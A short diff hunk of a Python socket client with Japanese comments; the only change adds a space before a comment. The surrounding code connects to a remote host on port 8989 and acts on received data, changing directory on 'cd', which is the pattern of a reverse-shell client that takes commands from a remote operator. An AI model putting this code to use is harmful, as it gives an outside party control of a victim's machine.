@@ -14,7 +14,7 @@ port = 8989
 s.connect((host,port))#ネットワークをバインドする
 
 while True:
-    data = s.recv(1024)#1024 buffer size
+    data = s.recv(1024) #1024 buffer size
     if data[:2].decode("utf-8") == 'cd': #byteを文字列に変換する
         os.chdir(data[3:].decode("utf-8"))#OS (Operating System) = オペレーティングシステムにアクセスする
     if len(data) > 0:
